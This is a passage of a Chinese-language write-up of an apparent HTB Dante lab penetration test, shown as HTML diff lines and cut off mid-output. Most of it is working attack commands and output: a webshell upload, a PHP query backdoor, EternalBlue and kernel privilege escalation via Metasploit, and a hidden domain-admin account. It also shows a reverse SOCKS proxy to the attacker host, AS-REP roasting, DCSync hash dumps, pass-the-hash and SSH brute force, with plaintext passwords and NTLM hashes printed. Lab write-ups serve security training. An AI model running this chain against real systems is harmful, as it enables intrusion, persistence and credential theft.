+SERVER_PORT&#x3D;&quot;80&quot;
+SERVER_PROTOCOL&#x3D;&quot;HTTP&#x2F;1.1&quot;
+SERVER_SIGNATURE&#x3D;&quot;&lt;address&gt;Apache&#x2F;2.4.43 (Win64) OpenSSL&#x2F;1.1.1g PHP&#x2F;7.4.7 Server at 172.16.1.13 Port 80&lt;&#x2F;address&gt;\n&quot;
+SERVER_SOFTWARE&#x3D;&quot;Apache&#x2F;2.4.43 (Win64) OpenSSL&#x2F;1.1.1g PHP&#x2F;7.4.7&quot;
+SYSTEMROOT&#x3D;&quot;C:\WINDOWS&quot;
+TMP&#x3D;&quot;\xampp\tmp&quot;
+WINDIR&#x3D;&quot;C:\WINDOWS&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后我们能够找到一个<code>/discuss/</code>路由，存在一个注册用户，我们随便注册一个账号登陆进去：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215124022490.png" alt="image-20250215124022490"></p>
+<p>登陆后在用户修改信息界面能够发现一个文件上传点，我们直接上传shell即可，就只有前端过滤：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215124205012.png" alt="image-20250215124205012"></p>
+<p>我们直接上传木马后用蚁剑连接即可：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215150005718.png" alt="image-20250215150005718"></p>
+<p>然后上传一个smf的shell，稳固下连接，方便后续提权，而且环境开启了windows的防火墙，我们这里直接通过掩日工具来进行免杀，就能成功绕过：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215164907729.png" alt="image-20250215164907729"></p>
+<p>这里存存在一个sql注入，是在web页面的用户修改位置，但是注入是布尔盲注，写脚本有些太麻烦了，sqlmap也不能跑，最后是在渗透完成后直接写的一个php文件来对数据库进行查询的：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">ExecuteQuery</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>   
+    <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tech_forum"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"数据库连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$rows</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$SQL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"查询失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$rows</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 执行查询</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">ExecuteQuery</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// 输出 JSON 格式</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">JSON_PRETTY_PRINT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"请提供 SQL 语句，如：query.php?sql=SELECT * FROM users"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但里面没啥东西，flag也没有。我就不过多讲了。</p>
+<p>然后正常进行信息收集进行提权，我们这里直接通过msf进行可用漏洞扫描，发现如下可用漏洞：</p>
+<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215165409392.png" alt="image-20250215165409392"></p>
+<p>但这里我们不要直接通过msf进行提权，这里我一个一个是下来发现最后能通过<code>exploit/windows/local/cve_2022_21882_win32k</code>这个漏洞模块来进行提权，获得admin权限，在Administrator中获得的我们的flag。</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215231506002.png" alt="image-20250215231506002"></p>
+<p>然后看了眼，这台机器没有域，所以这台机器也就完成了：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250215231730835.png" alt="image-20250215231730835"></p>
+<h3 id="172-16-1-20"><a href="#172-16-1-20" class="headerlink" title="172.16.1.20"></a>172.16.1.20</h3><p>扫描结果：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216175327674.png" alt="image-20250216175327674"></p>
+<p>由于我们扫描出存在永恒之蓝漏洞，我们这里就直接拿这个漏洞试一下，我们先检查下是否能够攻击这个漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010
+set rhost 172.16.1.20
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>结果如下：</p>
+<p><img src="C:/Users/35962/AppData/Roaming/Typora/typora-user-images/image-20250216180107746.png" alt="image-20250216180107746"></p>
+<p>发现是能够进行攻击的，我们直接利用攻击脚本进行攻击：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec
+set lhost 10.10.17.141
+set lport 8888
+set rhost 172.16.1.20
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216183330141.png" alt="image-20250216183330141"></p>
+<p>可以发现攻击成功，最后在<code>C:\Users\katwamba\Desktop</code>发现flag，并且还有一个<code>employee_backup.xlsx</code>文件，我们一样下载下来看看</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218144146483.png" alt="image-20250218144146483"></p>
+<p>发现是一堆像是用户名和密码的东西，保存下备用：</p>
+<pre class="line-numbers language-none"><code class="language-none">asmith	Princess1
+smoggat	Summer2019
+tmodle	P45678!
+ccraven	Password1
+kploty	Teacher65
+jbercov	4567Holiday1
+whaguey	acb123
+dcamtan	WorldOfWarcraft67
+tspadly	RopeBlackfieldForwardslash
+ematlis	JuneJuly1TY
+fglacdon	FinalFantasy7
+tmentrso	65RedBalloons
+dharding	WestminsterOrange5
+smillar	MarksAndSparks91
+bjohnston	Bullingdon1
+iahmed	Sheffield23
+plongbottom	PowerfixSaturdayClub777
+jcarrot	Tanenbaum0001
+lgesley	SuperStrongCantForget123456789
+
+asmith:Princess1
+smoggat:Summer2019
+tmodle:P45678!
+ccraven:Password1
+kploty:Teacher65
+jbercov:4567Holiday1
+whaguey:acb123
+dcamtan:WorldOfWarcraft67
+tspadly:RopeBlackfieldForwardslash
+ematlis:JuneJuly1TY
+fglacdon:FinalFantasy7
+tmentrso:65RedBalloons
+dharding:WestminsterOrange5
+smillar:MarksAndSparks91
+bjohnston:Bullingdon1
+iahmed:Sheffield23
+plongbottom:PowerfixSaturdayClub777
+jcarrot:Tanenbaum0001
+lgesley:SuperStrongCantForget123456789
+julian:manchesterunited
+ben:Welcometomyblog
+balthazar:TheJoker12345!
+mrb3n:S3kur1ty2020!
+Admin_129834765:SamsungOctober102030<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们查看用户信息时发现在mrb3n用户的用户信息中存在一个flag和该用户的密码</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218144938806.png" alt="image-20250218144938806"></p>
+<p>我们在查看信息的时候，我们发现当前机器属于<code>DANTE.local</code>这个域中的一台机器</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250216183853224.png" alt="image-20250216183853224"></p>
+<p>我们先设置一个二层代理，方便后续进行操作：</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.exe -c frpc.toml
+
+&#x2F;&#x2F;frpc.toml
+serverAddr &#x3D; &quot;10.10.17.141&quot;
+serverPort &#x3D; 7000
+
+[[proxies]]
+name &#x3D; &quot;socks5&quot;
+type &#x3D; &quot;tcp&quot;
+remotePort &#x3D; 6000
+[proxies.plugin]
+type &#x3D; &quot;socks5&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建隐蔽管理员方便后续：</p>
+<pre class="line-numbers language-none"><code class="language-none">net user hiddenadmin P@ssw0rd123 &#x2F;add &#x2F;domain
+net group &quot;Domain Admins&quot; hiddenadmin &#x2F;add &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后我们在查看路由和arp表之后都没发现新的网段：</p>
+<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all 
+route print 
+arp -a 
+netstat -ano 
+type C:\WINDOWS\System32\drivers\etc\hosts
+ipconfig &#x2F;displaydns | findstr &quot;Record&quot; | findstr &quot;Name Host&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>所以怀疑是域环境的隐藏网段，我们仔细检查下：</p>
+<pre class="line-numbers language-none"><code class="language-none">for &#x2F;L %i in (1,1,254) do ping -n 1 172.16.%i.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现一个新的网段<code>172.16.2.0/24</code>，我们手动给他添加进去：</p>
+<pre class="line-numbers language-none"><code class="language-none">run autoroute -s 172.16.2.0&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>现在拿msf进行下端口扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp
+set RHOSTS 10.10.10.0&#x2F;24   # 设置目标网段或单个 IP
+set THREADS 10             # 设置线程数（提高扫描速度）
+set PORTS 1-65535          # 指定端口范围（默认扫描 1-10000）
+run                        # 运行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218181431670.png" alt="image-20250218181431670"></p>
+<h4 id="172-16-2-5"><a href="#172-16-2-5" class="headerlink" title="172.16.2.5"></a>172.16.2.5</h4><p>我们先上传fscan来进行扫描，发现开放了下面的端口，并且获得机器的机器名<code>DANTE-DC02</code></p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218170033053.png" alt="image-20250218170033053"></p>
+<p>然后我们通过smb服务的匿名登陆来枚举用户名：</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;桌面&#x2F;tool&#x2F;fscan]
+└─# proxychains4 crackmapexec smb 172.16.2.5 --users
+[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf
+[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:135  ...  OK
+SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 &#x2F; Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:389  ...  OK
+SMB         172.16.2.5      445    DANTE-DC02       [-] Error enumerating domain users using dc ip 172.16.2.5: NTLM needs domain\username and a password
+SMB         172.16.2.5      445    DANTE-DC02       [*] Trying with SAMRPC protocol
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:139  ...  OK
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取的当前机器的域名<code>DANTE.ADMIN</code>，然后我们通kerberos协议来枚举用户名，用户名单就用<code>DANTE-DC01</code>上的用户名</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 .&#x2F;kerbrute_linux_amd64 userenum --dc 172.16.2.5 -d dante &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里不知道是网络的原因还是其他原因，就是没法枚举成功，老是报错，最后看其他师傅的wp发现存在 <code>jbercov@dante</code>用户，然后继续向下进行攻击；</p>
+<p>他开启的kerberos服务，针对没有启用 Kerberos 预身份验证的用户，可以使用 ASREProast 获取用户的 TGT，此过程不需要具备域账户，只需要与 KDC 建立连接即可进行攻击。</p>
+<pre class="line-numbers language-none"><code class="language-none">─# proxychains4 impacket-GetNPUsers dante&#x2F;jbercov -dc-ip 172.16.2.5 -no-pass -outputfile kerberoas.hash
+[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf
+[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0+20241209.91717.0fd9f288 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for jbercov
+&#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples&#x2F;GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now &#x3D; datetime.datetime.utcnow() + datetime.timedelta(days&#x3D;1)
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:88  ...  OK
+$krb5asrep$23$jbercov@DANTE:7bf913dc41a4ad59030318a38fb5d164$36eea9f5ff52ed9995204714bdc582ba99b2c292e3554f9d77d46f4fb7599ba2d7c85691d2cb815e1355d0c9fda0d6a59a780ed17f078169532d3ceef6c9597f6c8a066ecf3ad54d568d109c64e30d052a93cf5c62c75a0306715c0cba7403dd11062da7942c797a19645f557737cd92259a471c9dc371ddf9980333ede028f6bcc44f0645c4db9034ae3c1e83b98e2f278a86733e31b314a3d0cc436b78d449064212bb8c93750f1a4b2b1dce771f87bf990acea3e63ebc4202a4c874b1ebe04926b90a582a0bb47a1150e3539985001a686d52c68c4a7f9679c878fd9821634c12ecf1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取hash之后，我们直接通过john破解下这个密码：</p>
+<pre class="line-numbers language-none"><code class="language-none">john test.hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218193501103.png" alt="image-20250218193501103"></p>
+<p>破解出了密码<code>myspace7</code>，因为其开放了5985端口，我们就能直接通过winRM服务直接登陆</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 evil-winrm -i 172.16.2.5 -u jbercov -p myspace7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250218193954150.png" alt="image-20250218193954150"></p>
+<p>然后获取了第一个flag，然后进行先用msf进行上线，方便后续提权和查看该网段的其他机器，这里我们通winRM上传猎犬工具，然后进行信息收集</p>
+<pre class="line-numbers language-none"><code class="language-none">SharpHound.exe -c all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可以发现 JBERCOV 用户具备 GetChangesAll 权限，而 GetChangesAll 权限意味着可以利用 DCSync 导出域内的所有 hash。</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/20231229082415.png" alt="20231229082415"></p>
+<p>我们直接导出hash：</p>
+<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;桌面]
+└─# proxychains4 impacket-secretsdump -outputfile 172.16.2.5_DCSync DANTE.ADMIN&#x2F;jbercov:myspace7@172.16.2.5
+[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf
+[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0+20241209.91717.0fd9f288 - Copyright Fortra, LLC and its affiliated companies 
+
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:445  ...  OK
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:135  ...  OK
+[proxychains] Dynamic chain  ...  10.10.17.141:6000  ...  172.16.2.5:49667  ...  OK
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
+DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
+DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:ffbe21062cddbf4accba17eba4d585dc:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
+Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
+Administrator:des-cbc-md5:8ac752cea84f4a10
+krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
+krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
+krbtgt:des-cbc-md5:dcbff8a80b5b343e
+DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
+DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
+DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
+DANTE-DC02$:aes256-cts-hmac-sha1-96:b963259a2baabfec12c8978a882fe09e4cf673e71921c79ba5470518500d3b16
+DANTE-DC02$:aes128-cts-hmac-sha1-96:18ff2cb601e566d15e80adb9b595a406
+DANTE-DC02$:des-cbc-md5:a140fd8083f84576
+[*] Cleaning up... <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后通过hash传递直接通过<code>impacket-psexec</code>来进行登陆即可</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-psexec &#39;DANTE.ADMIN&#x2F;Administrator@172.16.2.5&#39; -hashes &#39;aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>也可以通过msf的模块来进行上线：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec
+set RHOSTS 172.16.2.5
+set SMBUser Administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8
+set LHOST 10.10.17.141
+set LPORT 9999
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>在管理员的目录中发现了这个文件，存在一个账号和密码</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219002933994.png" alt="image-20250219002933994"></p>
+<p>先记录下，后续备用，然后我们上传fscan，扫描下这个网段是否还有其他的存活ip，也可直接使用命令来进行探测</p>
+<pre class="line-numbers language-none"><code class="language-none">(for &#x2F;L %a IN (1,1,254) DO ping &#x2F;n 1 &#x2F;w 1 172.16.2.%a) | find &quot;Reply&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219031413006.png" alt="image-20250219031413006"></p>
+<p>能够发现<code>172.16.2.101</code>的是开放的，且只开放了22端口，我们搭个代理出来，方便后续进行操作</p>
+<h4 id="172-16-2-101"><a href="#172-16-2-101" class="headerlink" title="172.16.2.101"></a>172.16.2.101</h4><p>由于只开放了22端口，我们又在之前获得了一堆账号和密码，我们现在讲之前获取的账号密码组成密码本，进行爆破，可以通过msf的模块来进行操作：</p>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login
+set USERPASS_FILE &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;password.txt
+set RHOSTS 172.16.2.101
+set VERBOSE true
+set ThREADS 10
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>也可以通hydra来进行爆破：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 hydra -L users1.txt -P password.txt ssh:&#x2F;&#x2F;172.16.2.101 -t 2 -W 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里由于不知道啥原因，我都msf没法进行爆破，我是用hydra来进行爆破的：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219221855772.png" alt="image-20250219221855772"></p>
+<p>我们获得了一组账号，<code>julian|manchesterunited</code>，我们登陆下：</p>
+<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/image-20250219222025534.png" alt="image-20250219222025534"></p>
+<p>登陆成功，我们想办法提权，这里我们就不用msf了，应为没法连上这个地址，估计是代理的原因，我们直接使用工具进行提权，先上传工具扫描下漏洞：</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 scp &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;tool&#x2F;linux-exploit-suggester&#x2F;linux-exploit-suggester.sh julian@172.16.2.101:&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>扫描出如下结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">julian@DANTE-ADMIN-NIX05:&#x2F;tmp$ .&#x2F;linux-exploit-suggester.sh
+
+Available information:
+
+Kernel version: 5.4.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 20.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+81 kernel space exploits
+49 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;(20.04) ]&#123;kernel:5.12.13&#125;
+   Download URL: https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2022&#x2F;08&#x2F;29&#x2F;5&#x2F;1
+   Comments: kernel.unprivileged_userns_clone&#x3D;1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2022&#x2F;01&#x2F;25&#x2F;cve-2021-4034&#x2F;pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu&#x3D;10|11|12|13|14|15|16|17|18|19|20|21 ],debian&#x3D;7|8|9|10|11,fedora,manjaro
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;berdav&#x2F;CVE-2021-4034&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https:&#x2F;&#x2F;www.qualys.com&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156&#x2F;baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint&#x3D;19,[ ubuntu&#x3D;18|20 ], debian&#x3D;10
+   Download URL: https:&#x2F;&#x2F;codeload.github.com&#x2F;blasty&#x2F;CVE-2021-3156&#x2F;zip&#x2F;main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
